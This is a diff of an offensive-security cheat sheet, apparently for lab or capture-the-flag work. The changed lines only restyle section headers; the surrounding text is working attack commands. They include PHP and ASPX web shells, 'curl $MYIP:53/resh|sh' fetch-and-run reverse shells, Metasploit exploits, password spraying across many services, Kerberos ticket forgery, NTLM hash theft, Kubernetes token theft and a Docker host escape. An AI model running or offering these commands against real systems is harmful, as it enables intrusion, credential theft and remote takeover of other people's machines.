@@ -158,7 +158,7 @@ cd /mnt/c/hashcat; hashcat.exe -m 19700 hashes $(wslpath -w $rockyou)
 # Foothold: Tech and Protocols
 ## Web
 [*] Web Shell
-+---------- Create ----------+
+[###] Create
 -->> PHP
 echo -n '<?=`$_GET[cmd]`?>' | tee x.php
 
@@ -171,7 +171,7 @@ echo '<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="
 -->> XML / ASP (web.config)
 echo -e '<?xml version="1.0" encoding="UTF-8"?>\n<configuration>\n<system.webServer>\n<handlers accessPolicy="Read, Script, Write">\n<add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />\n</handlers>\n<security>\n<requestFiltering>\n<fileExtensions>\n<remove fileExtension=".config" />\n</fileExtensions>\n<hiddenSegments>\n<remove segment="web.config" />\n</hiddenSegments>\n</requestFiltering>\n</security>\n</system.webServer>\n</configuration>\n<% Response.ContentType = "text/plain"\nSet s = CreateObject("WScript.Shell")\nSet c = s.Exec("cmd /c " & Request("cmd"))\nResponse.Write c.StdOut.ReadAll() %>' | tee web.config
 
-+---------- Execute ----------+
+[###] Execute
 -->> PHP and ASP
 curl -G 'http://$TARGET/x.php' --path-as-is --data-urlencode 'cmd=whoami /priv'
 curl -G 'http://$TARGET/x.php' --path-as-is --data-urlencode 'cmd=powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQB...<METASPLOIT>...'
@@ -181,7 +181,7 @@ curl -X PUT -d @x.aspx http://$TARGET/x.txt
 curl -X MOVE http://$TARGET/x.txt -H 'Destination:http://$TARGET/x.aspx'
 curl -G --path-as-is 'http://$TARGET/x.aspx' --data-urlencode 'cmd=whoami /priv'
 
-+---------- Variations ----------+
+[###] Variations
 -->> PHP
 <?=`$_GET[cmd]`?>
 <?php system($_GET['cmd']); ?>
@@ -226,7 +226,7 @@ curl http://$TARGET/administrator/manifests/files/joomla.xml
 curl -s "http://$TARGET/api/index.php/v1/config/application?public=True" | jq
 
 [*] Git / Gitlab / Gitea
-+---------- Git ----------+
+[###] Git
 git-dumper http://$TARGET source; cd source; git status
 git diff --cached /file/name/here
 export GIT_SSL_NO_VERIFY=true; git clone https://$USERNAME:$PASSWORD@$DOM/USER/REPO.git ./git
@@ -239,7 +239,7 @@ git rev-list --all
 git cat-file -p acb753dd975a639f2dbc28ee8fd4d67adc50e609
 git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f033ca467a6362f@$TARGET:3000/$USERNAME/website.git
 
-+---------- Gitlab ----------+
+[###] Gitlab
 -->> CVE-2020-10977 (GitLab CE/EE 8.5 to 12.9)
 http://$TARGET/help
 msfconsole -q -x 'use exploit/multi/http/gitlab_file_read_rce; set VHOST git.$DOM; set SSL true; set RHOSTS $TARGET; set RPORT 443; set USERNAME test; set PASSWORD testtest; set LHOST tun0; set LPORT 8787; set ForceExploit true; run'
@@ -255,7 +255,7 @@ user.password_confirmation = '123qweasdF!'
 user.save!
 Login: https://git.$DOM/$USERNAME
 
-+---------- Gitea ----------+
+[###] Gitea
 docker-compose.yml
  volumes:
       - /home/developer/gitea/data:/data
@@ -305,20 +305,20 @@ node {
 
 
 [*] Pluck
-+---------- Set Password ----------+
+[###] Set Password
 XPASSWORD=lexypoo97
 
-+---------- Get Session ID ----------+
+[###] Get Session ID
 PHPSESSID=$(curl -s -i -L -X POST -d "cont1=$XPASSWORD&bogus=&submit=Log+in" 'http://$TARGET/login.php' -H 'Content-Type: application/x-www-form-urlencoded' | grep -oP 'PHPSESSID=\K[^;]+');echo $PHPSESSID
 
-+---------- Create Webshell  ----------+
+[###] Create Webshell 
 echo -n '<?=`$_GET[cmd]`?>' | tee x.php
 
-+---------- Upload Webshell  ----------+
+[###] Upload Webshell 
 zip x.zip x.php
 curl -s -i -X POST -F "sendfile=@x.zip;type=application/zip" -F "submit=Upload" "http://$TARGET/admin.php?action=installmodule" -H "Cookie: PHPSESSID=$PHPSESSID" | grep -oP 'The module has been installed successfully.'
 
-+---------- Execute Command ----------+
+[###] Execute Command
 wsh http://$TARGET/x.php
 curl $MYIP:53/resh|sh
 curl -G 'http://$TARGET/x.php' --path-as-is --data-urlencode 'cmd=whoami /priv'
@@ -335,48 +335,48 @@ splunksecrets splunk-decrypt -S splunk.secret --ciphertext '$1$NkgCo9/pK0KB'
 splunksecrets splunk-decrypt -S splunk.secret --ciphertext '$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY='
 
 [*] Zabbix
-+---------- Login Get Auth Key ----------+
+[###] Login Get Auth Key
 curl \
 --request POST "http://$TARGET/zabbix/api_jsonrpc.php" \
 --header 'Content-Type: application/json-rpc' \
 --data '{"jsonrpc":"2.0","method":"user.login","params":{"username":"matthew","password":"96qzn0h2e1k3"},"id":1}'
 
-+---------- Set Auth Key ----------+
+[###] Set Auth Key
 AUTH_KEY=23b5c3d2e3c6a3ac6ec692ece555aad1
 
-+---------- Add Account to All Groups ----------+
+[###] Add Account to All Groups
 for i in {0..50}; do response=$(curl \
 --request POST -s "http://$TARGET/zabbix/api_jsonrpc.php" \
 --header 'Content-Type: application/json-rpc' \
 --data "$(printf '{"jsonrpc":"2.0","method":"user.update","params":{"usrgrps":[{"usrgrpid":"%s"}],"userid":"3"},"auth":"%s","id":3}' "$i" "$AUTH_KEY")");[[ $response != *"error"* ]] && echo "[+] Added to group ID $i"; done
 
-+---------- Get Users, Password Hash and RoleID ----------+
+[###] Get Users, Password Hash and RoleID
 curl \
 --request POST -s "http://$TARGET/zabbix/api_jsonrpc.php" \
 --header 'Content-Type: application/json-rpc' \
 --data "$(printf '{"jsonrpc": "2.0", "method":"user.get", "params": {"selectRole":["roleid, u.passwd"]}, "auth":"%s", "id": 1}' "$AUTH_KEY")" | jq -r '.result[] | [.username, .role.passwd, .role.roleid] | @csv'
 
-+---------- Dump Active Sessions ----------+
+[###] Dump Active Sessions
 sqlmap \
 --method POST -u "http://$TARGET/zabbix/api_jsonrpc.php" \
 --headers="Content-Type: application/json-rpc" \
 --data="$(printf '{"jsonrpc":"2.0","method":"user.get","params":{"selectRole":["roleid, *"]},"auth":"%s","id":1}' "$AUTH_KEY")" \
 --random-agent -D zabbix -T sessions --columns --dump
 
-+---------- Verify Session ID ----------+
+[###] Verify Session ID
 curl -X POST http://$TARGET/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc": "2.0","method": "user.checkAuthentication","params": {"sessionid": "fdcfbcb99704cba0bf030d626d671510"},"id": 1}'
 
 [*] LaTeX
 http://$TARGET/equation.php?eqn=\newwrite\outfile\openout\outfile=x.php\^^77rite\outfile{<?=`$_GET[cmd]`?>}\closeout\outfile
 
 [*] XDEBUG_SESSION
-+---------- Start Listener ----------+
+[###] Start Listener
 python3 XDEBUG_SESSION.py
 
-+---------- Attack XDEBUG_SESSION ----------+
+[###] Attack XDEBUG_SESSION
 curl http://$TARGET -H "Cookie: XDEBUG_SESSION="
 
-+---------- Execute Commands ----------+
+[###] Execute Commands
 python_cmd >> system("curl $MYIP:53/resh|sh")
 
 [*] Curl
@@ -576,19 +576,19 @@ https://datafetcher.com/graphql-json-body-converter
 
 ## Infrastructure
 [*] (21) FTP
-+---------- Spray Service ----------+
+[###] Spray Service
 (hydra -I ftp://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
-+---------- List Files ----------+
+[###] List Files
 nxc ftp "$TARGET" -u '$USERNAME' -p '$PASSWORD' --ls
 
-+---------- Download Directory ----------+
+[###] Download Directory
 wget ftp://$TARGET --ftp-user='$USERNAME' --ftp-password='$PASSWORD' -np -nH -m -q -P ftp
 
-+---------- Upload File ----------+
+[###] Upload File
 curl ftp://$TARGET -u '$USERNAME':'$PASSWORD' -T filename.txt
 
-+---------- Login to Service ----------+
+[###] Login to Service
 ftp '$USERNAME'@"$TARGET"
 anonymous
 ls -a
@@ -597,35 +597,35 @@ ascii
 get file.txt -
 
 [*] (22) SSH
-+---------- Spray Service ----------+
+[###] Spray Service
 (hydra -I ssh://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
-+---------- View Types ----------+
+[###] View Types
 ssh -Q key
 
-+---------- Remove Keys ----------+
+[###] Remove Keys
 ssh-add -D
 
-+---------- Create Keys ----------+
+[###] Create Keys
 ssh-keygen -t ed25519 -f ssh -N ''; mv ssh ~/.ssh/ssh.key; chmod 600 ~/.ssh/ssh.key; cat ssh.pub | awk '{print $1 " " $2}' > /Upload/ssh.pub
 ssh-keygen -t rsa -f ssh -N ''; mv ssh ~/.ssh/ssh.key; chmod 600 ~/.ssh/ssh.key; cat ssh.pub | awk '{print $1 " " $2}' > /Upload/ssh.pub
 
-+---------- Add Public Key to Authorized Keys ----------+
+[###] Add Public Key to Authorized Keys
 echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDAS3I0GV78pbzK7Kd3m44tFBbqX1sXRpCv6LPjle3yW root@hostname' > TARGET > ~/.ssh/authorized_keys
 
-+---------- Login to Service ----------+
+[###] Login to Service
 sshuttle --ssh-cmd "ssh -i $HOME/.ssh/id_ed25519" -r $USERNAME@$TARGET 0.0.0.0/0 -v
 ssh $USERNAME@$TARGET -i id_ed25519 -oHostKeyAlgorithms=+ssh-ed25519 -oPubkeyAcceptedKeyTypes=+ssh-ed25519
 ssh $USERNAME@$TARGET -i id_rsa -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa
 ssh $USERNAME@$TARGET -i id_dsa -oHostKeyAlgorithms=+ssh-dss -oPubkeyAcceptedKeyTypes=+ssh-dss
 
-+---------- Port Forwarding ----------+
+[###] Port Forwarding
 sshuttle --ssh-cmd "ssh -i $HOME/.ssh/id_ed25519" -r $USERNAME@$TARGET 0.0.0.0/0 -v
 ssh $USERNAME@$TARGET -i id_ed25519 -L 33060:Localhost:33060 -L 5000:Localhost:5000
 ssh $USERNAME@$TARGET -i id_rsa -L 33060:Localhost:33060 -L 5000:Localhost:5000
 ssh $USERNAME@$TARGET -i id_dsa -L 33060:Localhost:33060 -L 5000:Localhost:5000
 
-+---------- Vault ----------+
+[###] Vault
 vault secrets enable ssh
 vault list ssh/roles
 vault write ssh/roles/root default_user=root key_type=otp cidr_list=0.0.0.0/0
@@ -633,20 +633,20 @@ vault write ssh/creds/root ip=$TARGET
 ssh root@$TARGET # key xxxxxxxxx-xxxx-xxxx-xxxxxxxxx
 
 [*] (23) Telnet
-+---------- Spray Service ----------+
+[###] Spray Service
 (hydra -I telnet://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
-+---------- Login to Service ----------+
+[###] Login to Service
 telnet --user '$USERNAME' $TARGET
 
 [*] (25) SMTP
-+---------- Search ----------+
+[###] Search
 nmap -p 25 --script="smtp* and not brute" --script-args "smtp-enum-users.methods={VRFY},userdb=/usr/share/nmap/nselib/data/usernames.lst" $TARGET
 
-+---------- Create Malicious File ----------+
+[###] Create Malicious File
 rlwrap msfconsole -q -x 'use exploit/windows/fileformat/office_word_hta; set SRVHOST tun0; set SRVPORT 8888; set LHOST tun0; set LPORT 7788; set FILENAME file.doc; run'
 
-+---------- Send ----------+
+[###] Send
 swaks \
         --to administrator@$DOM \
         --from $USERNAME@$DOM \
@@ -673,10 +673,10 @@ finger '$USERNAME'@$TARGET
 while read -r user; do finger "$user"@$TARGET; done < usernames
 
 [*] (88) Kerberos
-+---------- .ccache ----------+
+[###] .ccache
 impacket-getTGT $DOM/'$USERNAME' -hashes :8846F7EAEE8FB117AD06BDD830B7586C; kcme
 
-+---------- Kerberos .ccache Negotiation ----------+
+[###] Kerberos .ccache Negotiation
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request
 impacket-findDelegation -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
 impacket-addcomputer -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -computer-name mypc -computer-pass '123qweasdF!'
@@ -693,7 +693,7 @@ impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '12
 impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newhashes :$(impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs)
 while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request-user '$user'; done < usernames
 
-+---------- Silver Ticket ----------+
+[###] Silver Ticket
 -->> Domain SID
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(ObjectClass=user)(objectSid=*)(!(ObjectClass=foreignSecurityPrincipal)))" --attr objectSid | grep -avE 'nTSecurityDescriptor:|distinguishedName:' | cut -d ' ' -f 2 | sed 's/-[0-9]\+$//' | sort -u | sed '/^$/d' | tee silver-ticket
 
@@ -706,7 +706,7 @@ echo -n '$PASSWORD' | iconv -t UTF-16LE | openssl dgst -md4 | cut -d ' ' -f 2 | 
 -->> Create Ticket
 cat silver-ticket | { read a; read _; read c; impacket-ticketer -domain $DOM -domain-sid "$a" -spn "cifs/$DC" -nthash "$c" administrator 2>/dev/null; }; kcme
 
-+---------- Golden Ticket ----------+
+[###] Golden Ticket
 impacket-goldenPac -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$DC
 
 
@@ -719,26 +719,26 @@ for host in $(cat hosts_); do echo "================[   $host   ]===============
 for host in $(cat hosts_); do rpcclient -U "" $host -N -c "enumdomusers"; done | grep -oP 'user:\[\K[^]]+'
 
 [*] (161) SNMP
-+---------- Spray Service ----------+
+[###] Spray Service
 (hydra -I snmpv2c://$TARGET -P /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -t15 2>/dev/null &)
 
-+---------- Read Service ----------+
+[###] Read Service
 snmp-check $TARGET -c COMMUNITY_STRING -v 2c
 
 [*] (389) LDAP
-+---------- Spray Service ----------+
+[###] Spray Service
 (hydra -I ldap2://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
-+---------- Visualise LDAP ----------+
+[###] Visualise LDAP
 godap $TARGET -d $DOM -t ldap/$DC -k
 
-+---------- Domain SID ----------+
+[###] Domain SID
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --get-sid
 
-+---------- Trusted For Delegation ----------+
+[###] Trusted For Delegation
 nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success --trusted-for-delegation
 
-+---------- Other Attacks ----------+
+[###] Other Attacks
 nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success
 nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success -k
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M get-desc-users
@@ -748,23 +748,23 @@ nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --dc-list --
 nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=805306369)" "SAMAccountName" | awk '{print $6}' | grep '\$' > machines | sed 's/.$//' | tr '[:upper:]' '[:lower:]' > machines_pw; nxc smb $TARGET -u machines -p machines_pw | grep -oP '\[-\].*TRUST_ACCOUNT.*' | while read line; do echo -e "\e[1;33m$line <--- CHANGE PASSWORD NOW\!\e[0m"; done
 
 [*] (445) SMB
-+---------- Spray Service ----------+
+[###] Spray Service
 (hydra -I smb://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 (hydra -I smb2://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
-+---------- Banner ----------+
+[###] Banner
 nmap $TARGET -sS -T5 --script="smb*protocols,smb*security-mode" -p445
 
-+---------- Check Shares ----------+
+[###] Check Shares
 nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --shares --use-kcache
 
-+---------- Spider Share for Files ----------+
+[###] Spider Share for Files
 NXCSPIDER=$(nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' -M spider_plus | grep -oP '(?<=Saved share-file metadata to ")[^"]+');cat $NXCSPIDER | grep -vE 'epoch|size' | sed -E 's/[{}\",:]//g' | sed '/^        $/d' | tee smbfiles_$USERNAME
 
-+---------- Download Files Locally ----------+
+[###] Download Files Locally
 mkdir smb; smbclient //$TARGET/SHARE_NAME -U '$USERNAME'%'$PASSWORD' -D . -c 'lcd smb; recurse; prompt; mget *'
 
-+---------- Capture NTLMv2 ----------+
+[###] Capture NTLMv2
 sudo responder -I tun0 -v
 ntlm_theft.py --generate all -s $MYIP -f file; smbclient //$TARGET/'SHARE NAME' -D 'DIRECTORY/FOLDER' -U 'anonymous'%'' -c 'lcd file; recurse; prompt; mput *'
 echo -n '[shell]\nCommand=2\nIconFile=\\$MYIP\\responder\\t.ico\n[Taskbar]\nCommand=ToggleDesktop' > file.scf
@@ -774,17 +774,17 @@ ike-scan -M -A $TARGET --pskcrack=ike_hashes.txt
 psk-crack -d $rockyou ike_hashes.txt
 
 [*] (512-514) RSERVICES
-+---------- Spray Service ----------+
+[###] Spray Service
 (hydra -I rlogin://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
-+---------- Allow All Connections ----------+
+[###] Allow All Connections
 echo '+ +' > ~/.rhosts; chmod 600 ~/.rhosts
 
-+---------- Login to Service ----------+
+[###] Login to Service
 rsh -l $USERNAME $TARGET
 rlogin -l $USERNAME $TARGET
 
-+---------- Execute Commands ----------+
+[###] Execute Commands
 rsh -l $USERNAME $TARGET cat /etc/passwd
 
 [*] (631) IPP
@@ -803,14 +803,14 @@ COPY shell FROM PROGRAM 'id'; SELECT * FROM shell;
 COPY shell FROM PROGRAM 'MSF_Linux_Meterpreter_Web_Delivery'
 
 [*] (10249-10250) Kubelet
-+---------- View Pods ----------+
+[###] View Pods
 kubeletctl -s $TARGET pods
 
-+---------- Execute Commands ----------+
+[###] Execute Commands
 kubeletctl -s $TARGET run "cat /etc/passwd" --all-pods
 kubeletctl -s $TARGET run "cat /etc/passwd" -p $pod -n $namespace -c $container
 
-+---------- Get Token and CA.crt ----------+
+[###] Get Token and CA.crt
 pod=nginx; namespace=default; container=nginx
 kubeletctl -s $TARGET run "ls -la /run/secrets/kubernetes.io/serviceaccount" -p $pod -n $namespace -c $container
 kubeletctl -s $TARGET run "ls -la /var/run/secrets/kubernetes.io/serviceaccount" -p $pod -n $namespace -c $container
@@ -818,17 +818,17 @@ kubeletctl -s $TARGET run "ls -la /secrets/kubernetes.io/serviceaccout" -p $pod 
 kubeletctl -s $TARGET run "cat /secrets/kubernetes.io/serviceaccout/ca.crt" -p $pod -n $namespace -c $container | tee ca.crt; chmod 600 ca.crt
 kubeletctl -s $TARGET run "cat /secrets/kubernetes.io/serviceaccout/token" -p $pod -n $namespace -c $container | tee token; chmod 600 token
 
-+---------- Authenticating to Kubernetes API ----------+
+[###] Authenticating to Kubernetes API
 kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) get pod
 
-+---------- Kubernetes Privileges ----------+
+[###] Kubernetes Privileges
 kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) auth can-i --list
 
-+---------- Kubernetes Pod Details ----------+
+[###] Kubernetes Pod Details
 kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) get pod nginx -o yaml
 kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) get pod nginx -o yaml | grep -E 'namespace:|image:'
 
-+---------- Kubernetes Create Custom YAML ----------+
+[###] Kubernetes Create Custom YAML
 apiVersion: v1
 kind: Pod
 metadata:
@@ -850,7 +850,7 @@ spec:
   automountServiceAccountToken: true
   hostNetwork: true
 
-+---------- Kubernetes Create Custom Pod ----------+
+[###] Kubernetes Create Custom Pod
 kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) apply -f my.yaml
 kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) get pod
 
@@ -868,20 +868,20 @@ impacket-mssqlclient -k -no-pass -dc-ip $TARGET -target-ip $TARGET $DC
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET'
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth
 
-+---------- Get-Hash ----------+
+[###] Get-Hash
 impacket-smbserver -smb2support $ /Upload/windows
 sqsh -S $TARGET -U '$DOM\$USERNAME' -P '$PASSWORD' -D master -C "EXEC xp_dirtree '//$MYIP/$';"
 
-+---------- RID: Brute ----------+
+[###] RID: Brute
 nxc mssql $TARGET -u '$USERNAME' -p '$PASSWORD' --rid-brute
 
-+---------- SID: All ----------+
+[###] SID: All
 sqsh -S $TARGET -U '$DOM\$USERNAME' -P '$PASSWORD' -m bcp -D master -C "SELECT name, type_desc, CAST(sid AS VARBINARY(100)) AS sid FROM sys.server_principals WHERE type_desc LIKE '%WINDOWS%';" | while IFS='|' read -r n type s unused; do if [[ "$n" == *'name'* ]]; then continue; fi; s="${s#0x}"; py_output=$(python3 -c "import sys, struct; s=bytes.fromhex(sys.argv[1]); r=s[0]; n_sub=s[1]; i=struct.unpack('>H',s[6:8])[0]; i=i+(struct.unpack('>I',s[2:6])[0]<<16); d=[struct.unpack('<I',s[8+4*k:12+4*k])[0] for k in range(n_sub)]; sid_str = f'S-{r}-{i}-' + '-'.join(map(str, d)); print(sid_str)" "$s"); printf "|%s|%s|\n" "$n" "$py_output"; done | column -t -s '|'
 
-+---------- SID: Domain ----------+
+[###] SID: Domain
 sqsh -S $TARGET -U '$DOM\$USERNAME' -P '$PASSWORD' -m bcp -D master -C "SELECT name, type_desc, CAST(sid AS VARBINARY(100)) AS sid FROM sys.server_principals WHERE type_desc LIKE '%WINDOWS%';" | while IFS='|' read -r n type s unused; do if [[ "$n" == *'name'* ]]; then continue; fi; s="${s#0x}"; py_output=$(python3 -c "import sys, struct; s=bytes.fromhex(sys.argv[1]); r=s[0]; n_sub=s[1]; i=struct.unpack('>H',s[6:8])[0]; i=i+(struct.unpack('>I',s[2:6])[0]<<16); d=[struct.unpack('<I',s[8+4*k:12+4*k])[0] for k in range(n_sub)]; sid_str = f'S-{r}-{i}-' + '-'.join(map(str, d)); print(sid_str)" "$s"); if [[ "$py_output" == S-1-5-21-* ]]; then domain_sid=$(echo "$py_output" | sed 's/-[0-9]*$//'); echo "$domain_sid"; fi; done | sort -u
 
-+---------- Impacket-Mssqlclient ----------+
+[###] Impacket-Mssqlclient
 enum_impersonate
 exec_as_login sa
 enum_links
@@ -900,7 +900,7 @@ xp_cmdshell \windows\tasks\Reflect.exe http://$MYIP/windows/EfsPotato.exe "power
 SELECT table_name,table_schema from [databasename].INFORMATION_SCHEMA.TABLES;
 SELECT * FROM [databasename].[dbo].[tablename];
 
-+---------- Execute Commands ----------+
+[###] Execute Commands
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -C "SELECT name FROM master.dbo.sysdatabases;" | grep -oP '^name:\s*\K\S+'
 
 DB_NAME="master"
@@ -914,7 +914,7 @@ sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC xp_cmdshell 'dir C:\ && whoami /user /priv';"
 
-+---------- Proxy MSSQL ----------+
+[###] Proxy MSSQL
 wget https://github.com/0xdf-0xdf/mssqlproxy/raw/refs/heads/python3/mssqlclient.py
 wget https://github.com/DaddyBigFish/mssqlproxy/releases/download/dlls/Microsoft.SqlServer.Proxy.dll
 wget https://github.com/DaddyBigFish/mssqlproxy/releases/download/dlls/reciclador.dll
@@ -928,16 +928,16 @@ echo 'socks5  127.0.0.1 1337' | sudo tee -a /etc/proxychains.conf
 proxychains4 evil-winrm -i 127.0.0.1 -u $USERNAME -p $PASSWORD
 
 [*] (1521) OracleTNS
-+---------- Find Service Name ----------+
+[###] Find Service Name
 sudo odat snguesser -s $TARGET
 
-+---------- Find Valid Creds ----------+
+[###] Find Valid Creds
 echo 'c' | sudo odat passwordguesser -s $TARGET -n XE
 
-+---------- Execute Commands ----------+
+[###] Execute Commands
 sudo odat dbmsscheduler -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --cmd-exe --exec whoami
 
-+---------- SQL Shell and Queries----------+
+[###] SQL Shell and Queries----------+
 sudo odat search -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --sysdba --sql-shell
 SELECT * FROM v$version
 SELECT * FROM user_role_privs
@@ -948,74 +948,74 @@ SELECT table_name FROM all_tables
 SELECT * FROM tab
 SELECT * FROM EMPLOYEES
 
-+---------- Download Files ----------+
+[###] Download Files
 sudo odat utlfile -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getFile 'C:\' 'secret.txt' output
 sudo odat utlfile -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getFile '/etc' 'passwd' output
 sudo odat dbmsxslprocessor -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getFile 'C:\' 'secret.txt' output; cat output
 sudo odat dbmsxslprocessor -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getFile '/etc' 'passwd' output; cat output
 
-+---------- Upload Files ----------+
+[###] Upload Files
 sudo odat utlfile -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --putFile 'C:\windows\tasks\' '' upload.file
 
 [*] (2049) NFS
-+---------- List Mounts ----------+
+[###] List Mounts
 showmount -e $TARGET; mkdir nfs 2>/dev/null
 
-+---------- Version Check ----------+
+[###] Version Check
 for v in 2 3 4; do sudo mount -t nfs -o vers=$v,nolock $TARGET:/DIRECTORY ./nfs && echo "vers=$v SUCCESS" && sudo umount ./nfs || echo "vers=$v FAILED"; done
 
-+---------- Mount NFS, List Files ----------+
+[###] Mount NFS, List Files
 sudo mount -t nfs -o vers=3,nolock "$TARGET":"/DIRECTORY" "./nfs"
 sudo tree -puga "./nfs/"
 
-+---------- Unmount NFS ----------+
+[###] Unmount NFS
 sudo umount --lazy "./nfs"; rm -rf "./nfs"
 
-+---------- Copy Files to Current Folder ----------+
+[###] Copy Files to Current Folder
 sudo cp -r ./nfs/. .
 
-+---------- Open Files as Sudo ----------+
+[###] Open Files as Sudo
 sudo open file.txt
 sudo open file.png
 
-+---------- Add User for Reading Files ----------+
+[###] Add User for Reading Files
 sudo adduser -u 1002 mntuser
 sudo su mntuser
 setpriv --reuid=1002 --regid=1002 --clear-groups -- ls -laR
 
 [*] (2375) Docker
-+---------- List Images ----------+
+[###] List Images
 curl -s http://$TARGET:2375/images/json | jq -r .[].RepoTags[]
 alpine:latest
 
-+---------- Create Image ----------+
+[###] Create Image
 curl -s -X POST http://10.129.121.211:2375/images/create?fromImage=alpine&tag=latest
 
-+---------- List Containers ----------+
+[###] List Containers
 (echo -e "ID\tSTATE\tIMAGE\tIP"; curl -s http://$TARGET:2375/containers/json?all=true | jq -r '.[] | [.Id, .State, .Image, (.NetworkSettings.Networks | to_entries[0].value.IPAddress)] | @tsv') | column -t
 
-+---------- Create Container using Image and Start ----------+
+[###] Create Container using Image and Start
 containerID=$(curl -s -X POST http://10.129.121.211:2375/containers/create -H "Content-Type: application/json" -d '{"Image":"alpine","Cmd":["sleep", "400"],"HostConfig":{"Binds":["/:/mnt"]}}' | jq -r .Id); curl -s -X POST http://10.129.121.211:2375/containers/"$containerID"/start; curl -s -X POST http://10.129.121.211:2375/containers/"$containerID"/exec -H "Content-Type: application/json" -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["chroot","/mnt","sh"]}'
 
-+---------- Start Container ----------+
+[###] Start Container
 containerID=f3f61958a8f66f50f2138af84d85fdafe6e1e65ddd36fdd9fa27acc4cae57d96; curl -s -X POST http://10.129.121.211:2375/containers/"$containerID"/start; curl -s -X POST http://10.129.121.211:2375/containers/"$containerID"/exec -H "Content-Type: application/json" -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["chroot","/mnt","sh"]}'
 
-+---------- Execute Command ----------+
+[###] Execute Command
 commandID=$(curl -s -X POST http://$TARGET:2375/containers/"$containerID"/exec -H "Content-Type: application/json" -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-c","cat /mnt/etc/passwd; ls -la /mnt"]}' | jq -r .Id); curl -s -X POST http://$TARGET:2375/exec/"$commandID"/start -H "Content-Type: application/json" -d '{"Detach":false,"Tty":true}'
 
-+---------- Remove Containers ----------+
+[###] Remove Containers
 curl -s -X DELETE http://$TARGET:2375/containers/7d9f2df890e2ce4a9c8342a64c33c01755b800b2c6b7b6106fce93fe056da256?force=true
 
 [*] (3306) MySQL
-+---------- Spray Service ----------+
+[###] Spray Service
 (hydra -I mysql://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
-+---------- Bruteforce Using Defaults ----------+
+[###] Bruteforce Using Defaults
 cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt | cut -d: -f1 | sort -u > /tmp/mysqlusernames
 cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt | cut -d: -f2 | sort -u > /tmp/mysqlpasswords
